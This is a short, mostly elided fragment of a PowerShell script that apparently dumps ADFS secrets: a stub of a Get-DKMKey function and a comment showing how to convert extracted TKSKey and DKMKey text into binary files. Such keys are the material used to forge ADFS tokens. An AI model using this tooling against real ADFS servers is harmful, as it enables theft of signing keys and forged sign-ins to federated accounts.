# Native PowerShell ADFS Dump script without the need for the ActiveDirectory or SQL module.
# Original from https://github.com/ZephrFish/ADFSDump-PS
# Changed by https://github.com/ville87/
function Get-DKMKey {
    param (
...
<# 
The following code can be used to create the bin files, TKSKey:
[IO.File]::WriteAllBytes("C:\Users\user1\Desktop\TKSKey.bin", [Convert]::FromBase64String([IO.File]::ReadAllText("C:\Users\user1\Desktop\TKSKey.txt")))
DKMKey:
$content = Get-Content C:\Users\user1\Desktop\DKMkey.txt
...
[IO.File]::WriteAllBytes("C:\Users\user1\Desktop\DKMkey.bin", $byteArray)
#>